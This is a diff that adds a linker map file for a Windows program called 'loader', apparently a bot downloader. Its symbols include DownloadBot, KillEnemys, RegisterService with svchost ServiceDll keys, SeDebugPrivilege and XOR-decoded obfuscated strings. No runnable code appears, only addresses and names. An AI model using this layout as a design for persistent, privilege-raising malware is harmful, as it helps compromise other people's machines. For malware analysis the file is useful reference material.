@@ -1,0 +1,164 @@
+ loader
+
+ Timestamp is 4269b8e2 (Sat Apr 23 06:54:26 2005)
+
+ Preferred load address is 00400000
+
+ Start         Length     Name                   Class
+ 0001:00000000 000000ecH .idata$5                CODE
+ 0001:000000f0 00000020H .data                   CODE
+ 0001:00000110 00000000H .data1                  CODE
+ 0001:00000120 00000538H .rdata                  CODE
+ 0001:00000660 00000c7cH .text                   CODE
+ 0001:000012e0 00000400H .bss                    CODE
+ 0001:000016e0 00000078H .idata$2                CODE
+ 0001:00001758 00000014H .idata$3                CODE
+ 0001:0000176c 000000ecH .idata$4                CODE
+ 0001:00001858 000002ccH .idata$6                CODE
+ 0001:00001b24 00000000H .edata                  CODE
+
+  Address         Publics by Value              Rva+Base     Lib:Object
+
+ 0001:00000000       __imp__CloseServiceHandle@4 00401000     advapi32:ADVAPI32.dll
+ 0001:00000004       __imp__CreateServiceA@52   00401004     advapi32:ADVAPI32.dll
+ 0001:00000008       __imp__OpenSCManagerA@12   00401008     advapi32:ADVAPI32.dll
+ 0001:0000000c       __imp__StartServiceA@12    0040100c     advapi32:ADVAPI32.dll
+ 0001:00000010       __imp__OpenProcessToken@12 00401010     advapi32:ADVAPI32.dll
+ 0001:00000014       __imp__OpenThreadToken@16  00401014     advapi32:ADVAPI32.dll
+ 0001:00000018       __imp__AdjustTokenPrivileges@24 00401018     advapi32:ADVAPI32.dll
+ 0001:0000001c       __imp__LookupPrivilegeValueA@12 0040101c     advapi32:ADVAPI32.dll
+ 0001:00000020       __imp__RegSetValueExA@24   00401020     advapi32:ADVAPI32.dll
+ 0001:00000024       __imp__RegQueryValueExA@24 00401024     advapi32:ADVAPI32.dll
+ 0001:00000028       __imp__RegCreateKeyA@12    00401028     advapi32:ADVAPI32.dll
+ 0001:0000002c       __imp__RegCloseKey@4       0040102c     advapi32:ADVAPI32.dll
+ 0001:00000030       __imp__RegOpenKeyExA@20    00401030     advapi32:ADVAPI32.dll
+ 0001:00000034       \177ADVAPI32_NULL_THUNK_DATA 00401034     advapi32:ADVAPI32.dll
+ 0001:00000038       __imp__GetCurrentProcess@0 00401038     kernel32:KERNEL32.dll
+ 0001:0000003c       __imp__CreateFileA@28      0040103c     kernel32:KERNEL32.dll
+ 0001:00000040       __imp__lstrlenA@4          00401040     kernel32:KERNEL32.dll
+ 0001:00000044       __imp__CloseHandle@4       00401044     kernel32:KERNEL32.dll
+ 0001:00000048       __imp__WriteFile@20        00401048     kernel32:KERNEL32.dll
+ 0001:0000004c       __imp__Sleep@4             0040104c     kernel32:KERNEL32.dll
+ 0001:00000050       __imp__ExpandEnvironmentStringsA@12 00401050     kernel32:KERNEL32.dll
+ 0001:00000054       __imp__CreateMutexA@12     00401054     kernel32:KERNEL32.dll
+ 0001:00000058       __imp__GetLastError@0      00401058     kernel32:KERNEL32.dll
+ 0001:0000005c       __imp__ExitProcess@4       0040105c     kernel32:KERNEL32.dll
+ 0001:00000060       __imp__OpenProcess@12      00401060     kernel32:KERNEL32.dll
+ 0001:00000064       __imp__GetVersionExA@4     00401064     kernel32:KERNEL32.dll
+ 0001:00000068       __imp__GetCurrentThread@0  00401068     kernel32:KERNEL32.dll
+ 0001:0000006c       __imp__TerminateProcess@8  0040106c     kernel32:KERNEL32.dll
+ 0001:00000070       \177KERNEL32_NULL_THUNK_DATA 00401070     kernel32:KERNEL32.dll
+ 0001:00000074       __imp__strncpy             00401074     msvcrt:MSVCRT.dll
+ 0001:00000078       __imp__strerror            00401078     msvcrt:MSVCRT.dll
+ 0001:0000007c       __imp__strcpy              0040107c     msvcrt:MSVCRT.dll
+ 0001:00000080       __imp___strlwr             00401080     msvcrt:MSVCRT.dll
+ 0001:00000084       __imp__sscanf              00401084     msvcrt:MSVCRT.dll
+ 0001:00000088       __imp__strlen              00401088     msvcrt:MSVCRT.dll
+ 0001:0000008c       __imp__atoi                0040108c     msvcrt:MSVCRT.dll
+ 0001:00000090       __imp__strstr              00401090     msvcrt:MSVCRT.dll
+ 0001:00000094       __imp__memcmp              00401094     msvcrt:MSVCRT.dll
+ 0001:00000098       __imp__memset              00401098     msvcrt:MSVCRT.dll
+ 0001:0000009c       \177MSVCRT_NULL_THUNK_DATA 0040109c     msvcrt:MSVCRT.dll
+ 0001:000000a0       __imp__GetModuleFileNameExA@16 004010a0     psapi:PSAPI.DLL
+ 0001:000000a4       __imp__EnumProcesses@12    004010a4     psapi:PSAPI.DLL
+ 0001:000000a8       __imp__EnumProcessModules@16 004010a8     psapi:PSAPI.DLL
+ 0001:000000ac       \177PSAPI_NULL_THUNK_DATA  004010ac     psapi:PSAPI.DLL
+ 0001:000000b0       __imp__wsprintfA           004010b0     user32:USER32.dll
+ 0001:000000b4       \177USER32_NULL_THUNK_DATA 004010b4     user32:USER32.dll
+ 0001:000000b8       __imp__inet_addr@4         004010b8     ws2_32:WS2_32.dll
+ 0001:000000bc       __imp__gethostbyname@4     004010bc     ws2_32:WS2_32.dll
+ 0001:000000c0       __imp__WSAGetLastError@0   004010c0     ws2_32:WS2_32.dll
+ 0001:000000c4       __imp__closesocket@4       004010c4     ws2_32:WS2_32.dll
+ 0001:000000c8       __imp__WSAStartup@8        004010c8     ws2_32:WS2_32.dll
+ 0001:000000cc       __imp__htons@4             004010cc     ws2_32:WS2_32.dll
+ 0001:000000d0       __imp__socket@12           004010d0     ws2_32:WS2_32.dll
+ 0001:000000d4       __imp__connect@12          004010d4     ws2_32:WS2_32.dll
+ 0001:000000d8       __imp__send@16             004010d8     ws2_32:WS2_32.dll
+ 0001:000000dc       __imp__recv@16             004010dc     ws2_32:WS2_32.dll
+ 0001:000000e0       __imp__select@20           004010e0     ws2_32:WS2_32.dll
+ 0001:000000e4       __imp____WSAFDIsSet@8      004010e4     ws2_32:WS2_32.dll
+ 0001:000000e8       \177WS2_32_NULL_THUNK_DATA 004010e8     ws2_32:WS2_32.dll
+ 0001:000000f0       ?signs@@3PAPADA            004010f0     processes.obj
+ 0001:00000104       ?winsigns@@3PAPADA         00401104     windows.obj
+ 0001:00000120       ??_C@_0BL@A@3C6764727A7D4C22253D777F7F?$AA@ 00401120     inet.obj
+ 0001:0000013c       ??_C@_0CN@PEFEMHEP@46717661607C7F777267337F7C727776@ 0040113c     inet.obj
+ 0001:0000016c       ??_C@_0BD@A@606A7D21783D7D7667?$AA@ 0040116c     inet.obj
+ 0001:00000180       ??_C@_0CO@GPBNJIMD@GET?5?$CFs?5HTTP?11?40?$AN?6User?9Agent?3?5?$CFs?$AN@ 00401180     inet.obj
+ 0001:000001b0       ??_C@_04A@?$AN?6?$AN?6?$AA@ 004011b0     inet.obj
+ 0001:000001b8       ??_C@_05A@HTTP?1?$AA@      004011b8     inet.obj
+ 0001:00000240       ??_C@_0BH@A@6A7C717A61607C7F777267?$AA@ 00401240     loader.obj
+ 0001:00000258       ??_C@_0CL@JDPLHPPF@36447A7D577A61364F6764727A7D4C22@ 00401258     loader.obj
+ 0001:00000288       ??_C@_02A@?$CFx?$AA@       00401288     misc.obj
+ 0001:0000028c       ??_C@_0BD@A@727D677A657A616660?$AA@ 0040128c     processes.obj
+ 0001:000002a0       ??_C@_0BD@A@78726063766160786A?$AA@ 004012a0     processes.obj
+ 0001:000002b4       ??_C@_0BD@A@697C7D76727F72617E?$AA@ 004012b4     processes.obj
+ 0001:000002c8       ??_C@_0N@A@7E7072757676?$AA@ 004012c8     processes.obj
+ 0001:000002d8       ??_C@_07A@svchost?$AA@     004012d8     processes.obj
+ 0001:000002e0       ??_C@_04A@?4dll?$AA@       004012e0     processes.obj
+ 0001:000002e8       ??_C@_0BB@A@SeDebugPrivilege?$AA@ 004012e8     processes.obj
+ 0001:000002fc       ??_C@_0P@A@4764727A7D2225?$AA@ 004012fc     service.obj
+ 0001:0000030c       ??_C@_0CJ@GGKPFMGP@4764727A7D33222533717A6733606663@ 0040130c     service.obj
+ 0001:00000340       ??_C@_0FJ@NNELIDNI@36406A6067767E417C7C67364F406A60@ 00401340     service.obj
+ 0001:000003a0       ??_C@_05A@?$CFs?2?$CFs?$AA@ 004013a0     service.obj
+ 0001:000003c0       ??_C@_0ED@NNEIPKMN@406A6067767E4F50666161767D67507C@ 004013c0     service.obj
+ 0001:00000420       ??_C@_0M@A@Description?$AA@ 00401420     service.obj
+ 0001:00000440       ??_C@_0BDN@JIJJPOME@507C7E7E667D7A707267766033647A67@ 00401440     service.obj
+ 0001:00000580       ??_C@_0L@A@Parameters?$AA@ 00401580     service.obj
+ 0001:0000058c       ??_C@_0L@A@ServiceDll?$AA@ 0040158c     service.obj
+ 0001:000005a0       ??_C@_0GL@GNPDJEKE@407C7567647261764F5E7A70617C607C@ 004015a0     service.obj
+ 0001:00000620       ??_C@_0P@A@7D766760657060?$AA@ 00401620     service.obj
+ 0001:00000630       ??_C@_03A@?$CFs?$AA?$AA@   00401630     service.obj
+ 0001:00000634       ??_C@_0BD@A@7E607B67723D766B76?$AA@ 00401634     windows.obj
+ 0001:00000648       ??_C@_0P@A@707E773D766B76?$AA@ 00401648     windows.obj
+ 0001:00000660       ?DnsResolve@@YAHPAD@Z      00401660 f   inet.obj
+ 0001:00000690       ?DownloadBot@@YAXPAD@Z     00401690 f   inet.obj
+ 0001:000008b4       ?ready@@YAHIG@Z            004018b4 f   inet.obj
+ 0001:00000924       ?GetHTTPRespCode@@YAHI@Z   00401924 f   inet.obj
+ 0001:000009a4       ?_WinMain@@YGHXZ           004019a4 f   loader.obj
+ 0001:00000a44       ?xor_hex_string@@YAXPAE0H@Z 00401a44 f   misc.obj
+ 0001:00000ac8       ?decode_string@@YAPADPAD@Z 00401ac8 f   misc.obj
+ 0001:00000af4       ?PrintModules@@YAXK@Z      00401af4 f   processes.obj
+ 0001:00000c1c       ?KillEnemy@@YAHK@Z         00401c1c f   processes.obj
+ 0001:00000da8       ?KillEnemys@@YAXXZ         00401da8 f   processes.obj
+ 0001:00000df4       ?RegisterService@@YAHPAD@Z 00401df4 f   service.obj
+ 0001:000010e4       ?CheckWindows@@YAXK@Z      004020e4 f   windows.obj
+ 0001:000011b8       ?CloseWindows@@YAXXZ       004021b8 f   windows.obj
+ 0001:0000120c       _strncpy                   0040220c f   msvcrt:MSVCRT.dll
+ 0001:00001212       _memset                    00402212 f   msvcrt:MSVCRT.dll
+ 0001:00001218       _memcmp                    00402218 f   msvcrt:MSVCRT.dll
+ 0001:0000121e       _strstr                    0040221e f   msvcrt:MSVCRT.dll
+ 0001:00001224       _atoi                      00402224 f   msvcrt:MSVCRT.dll
+ 0001:0000122a       _strlen                    0040222a f   msvcrt:MSVCRT.dll
+ 0001:00001230       _sscanf                    00402230 f   msvcrt:MSVCRT.dll
+ 0001:00001240       __alloca_probe             00402240 f   msvcrt:chkstk.obj
+ 0001:00001240       __chkstk                   00402240 f   msvcrt:chkstk.obj
+ 0001:00001270       __strlwr                   00402270 f   msvcrt:MSVCRT.dll
+ 0001:00001276       _strcpy                    00402276 f   msvcrt:MSVCRT.dll
+ 0001:0000127c       _strerror                  0040227c f   msvcrt:MSVCRT.dll
+ 0001:00001282       _EnumProcessModules@16     00402282 f   psapi:PSAPI.DLL
+ 0001:00001288       _GetModuleFileNameExA@16   00402288 f   psapi:PSAPI.DLL
+ 0001:0000128e       _EnumProcesses@12          0040228e f   psapi:PSAPI.DLL
+ 0001:00001294       _inet_addr@4               00402294 f   ws2_32:WS2_32.dll
+ 0001:0000129a       _gethostbyname@4           0040229a f   ws2_32:WS2_32.dll
+ 0001:000012a0       _WSAGetLastError@0         004022a0 f   ws2_32:WS2_32.dll
+ 0001:000012a6       _closesocket@4             004022a6 f   ws2_32:WS2_32.dll
+ 0001:000012ac       _WSAStartup@8              004022ac f   ws2_32:WS2_32.dll
+ 0001:000012b2       _htons@4                   004022b2 f   ws2_32:WS2_32.dll
+ 0001:000012b8       _socket@12                 004022b8 f   ws2_32:WS2_32.dll
+ 0001:000012be       _connect@12                004022be f   ws2_32:WS2_32.dll
+ 0001:000012c4       _send@16                   004022c4 f   ws2_32:WS2_32.dll
+ 0001:000012ca       _recv@16                   004022ca f   ws2_32:WS2_32.dll
+ 0001:000012d0       _select@20                 004022d0 f   ws2_32:WS2_32.dll
+ 0001:000012d6       ___WSAFDIsSet@8            004022d6 f   ws2_32:WS2_32.dll
+ 0001:000016e0       __IMPORT_DESCRIPTOR_MSVCRT 004026e0     msvcrt:MSVCRT.dll
+ 0001:000016f4       __IMPORT_DESCRIPTOR_PSAPI  004026f4     psapi:PSAPI.DLL
+ 0001:00001708       __IMPORT_DESCRIPTOR_KERNEL32 00402708     kernel32:KERNEL32.dll
+ 0001:0000171c       __IMPORT_DESCRIPTOR_USER32 0040271c     user32:USER32.dll
+ 0001:00001730       __IMPORT_DESCRIPTOR_ADVAPI32 00402730     advapi32:ADVAPI32.dll
+ 0001:00001744       __IMPORT_DESCRIPTOR_WS2_32 00402744     ws2_32:WS2_32.dll
+ 0001:00001758       __NULL_IMPORT_DESCRIPTOR   00402758     msvcrt:MSVCRT.dll
+
+ entry point at        0000:00000000
+
+ Static symbols
+
